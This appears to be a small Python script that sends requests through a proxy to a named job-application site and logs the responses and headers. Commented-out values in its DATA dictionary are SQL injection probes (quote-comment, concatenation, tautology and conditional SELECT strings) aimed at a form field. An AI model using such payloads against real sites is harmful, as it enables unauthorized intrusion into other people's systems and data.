# url = 'https://www.speaking-agency.com/jobs/en/candidature/autocomplete/name/10'
url = 'https://www.speaking-agency.com/jobs/en/application/step/confirm'

# https: // my-speaking-agency.com/portail/web/employee/apply
# request_id: 51089132
# position: 1
# latitude: 48.8060007
# longitude: 2.2726329
# work_until_choice: yes

# https: // my-speaking-agency.com/portail/web/employee/presentation/ope
# ope: CREATE
# jobarea: LINGUISTIC
# user: 53844214

import argparse
import os
import threading
import time
from urllib import parse

import requests

# PATH = 'C:\\Users\\Pende\\Documents\\myapps\\scrappers\\apps\\socket\\responses.html'

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

LOG = os.path.join(BASE_DIR, 'responses.html')

LOG_HEADERS = os.path.join(BASE_DIR, 'headers.txt')

PROXIES = {
    'http': '163.172.226.142'
}

DATA = {
    # url: """'; --""",
    # 'url': """ED'%2b'EC""",
    # 'url': """ED'||'HEC""",
    # 'url': """EDHEC' OR 'EDHEC'='EDHEC""",
    # 'url': """5-1""",
    # 'url': """SELECT IF(1=1,'true','false')""",
    # 'url': """IF (1=1) SELECT 'true' ELSE SELECT 'false'""",
    'url': """"""
}

def writer(func):
    def wrapper(**kwargs):
        with open(LOG, 'a', encoding='utf-8') as f:
            # Func() is get or post
            # method below
            response = func()
            if response:
                f.write(response.text)
                if 'headers' in kwargs:
                    if kwargs['headers']:
                        with open(LOG_HEADERS, 'a', encoding='utf-8') as h:
                            h.write(str(response.headers))
                f.write('\n')

    return wrapper

@writer
def post():
    response = requests.post(url, data=DATA, proxies=PROXIES)
    if response:
        print('Success for @ %s' % url)
        return response
    return None

@writer
def get():
    params = parse.urlencode(DATA)
    constructed_url = url + '?' + params
    response = requests.post(constructed_url, proxies=PROXIES)
    if response:
        print('Success for @ %s' % constructed_url)
        return response
    return None

def run(method='get'):
    if method == 'get':
        using = get
    else:
        using = post
    # Using the wrapper() function above
    # which is executed in the thread
    thread = threading.Thread(target=using, kwargs={'headers': True})
    thread.start()


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-p', help='Proxy', type=str, required=False)
    args = parser.parse_args()
    if args.p:
        PROXIES.update({'http': args.p})
    # while True:
    #     run(method='get')
    #     time.sleep(30)
    run(method='get')
